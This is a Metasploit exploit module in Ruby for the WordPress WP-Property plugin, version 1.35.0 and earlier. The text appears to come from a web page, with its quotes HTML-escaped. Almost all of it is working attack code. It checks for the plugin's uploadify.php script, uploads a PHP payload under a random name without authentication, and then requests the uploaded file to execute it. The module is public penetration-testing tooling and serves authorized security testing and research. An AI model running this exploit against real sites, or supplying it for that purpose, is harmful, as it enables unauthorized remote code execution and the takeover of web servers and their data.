# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
 
require &#039;msf/core&#039;
require &#039;msf/core/exploit/php_exe&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::PhpEXE
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;WordPress WP-Property PHP File Upload Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in WP-Property <= 1.35.0 WordPress
                plugin. By abusing the uploadify.php file, a malicious user can upload a file to a
                temp directory without authentication, which results in arbitrary code execution.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Sammy FORGIT&#039;, # initial discovery
                    &#039;James Fitts <fitts.james[at]gmail.com>&#039; # metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;82656&#039; ],
                    [ &#039;BID&#039;, &#039;53787&#039; ],
                    [ &#039;EDB&#039;, &#039;18987&#039;],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00",
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; } ],
                    [ &#039;Linux x86&#039;, { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039; } ]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Mar 26 2012&#039;))
 
        register_options(
            [
            ], self.class)
    end
 
    def check
        uri =  target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
 
        res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{uri}wp-content/plugins/wp-property/third-party/uploadify/uploadify.php"
        })
 
        if not res or res.code != 200
            return Exploit::CheckCode::Unknown
        end
 
        return Exploit::CheckCode::Appears
    end
 
    def exploit
        uri =  target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
 
        peer = "#{rhost}:#{rport}"
 
        @payload_name = "#{rand_text_alpha(5)}.php"
        php_payload = get_write_exec_payload(:unlink_self=>true)
 
        data = Rex::MIME::Message.new
        data.add_part(php_payload, "application/octet-stream", nil, "form-data; name=\"Filedata\"; filename=\"#{@payload_name}\"")
        data.add_part("#{uri}wp-content/plugins/wp-property/third-party/uploadify/", nil, nil, "form-data; name=\"folder\"")
        post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)
 
        print_status("#{peer} - Uploading payload #{@payload_name}")
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => "#{uri}wp-content/plugins/wp-property/third-party/uploadify/uploadify.php",
            &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
            &#039;data&#039;   => post_data
        })
 
        if not res or res.code != 200 or res.body !~ /#{@payload_name}/
            fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Upload failed")
        end
 
        upload_uri = res.body
 
        print_status("#{peer} - Executing payload #{@payload_name}")
        res = send_request_raw({
            &#039;uri&#039;    => upload_uri,
            &#039;method&#039; => &#039;GET&#039;
        })
    end
end

